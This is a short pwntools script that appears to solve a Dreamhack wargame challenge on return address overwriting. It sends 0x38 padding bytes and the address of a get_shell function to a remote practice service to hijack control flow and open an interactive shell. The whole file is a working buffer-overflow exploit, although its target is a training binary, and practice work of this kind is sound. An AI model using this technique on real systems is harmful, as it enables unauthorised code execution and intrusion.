from pwn import *

port = 17899
rem = remote("host1.dreamhack.games", port)

elf = ELF("./Pwnable/Return Address Overwrite/problem/rao")

payload = b'A'*0x38 
payload += p64(elf.symbols['get_shell'])

rem.sendlineafter("Input: ", payload)

rem.interactive()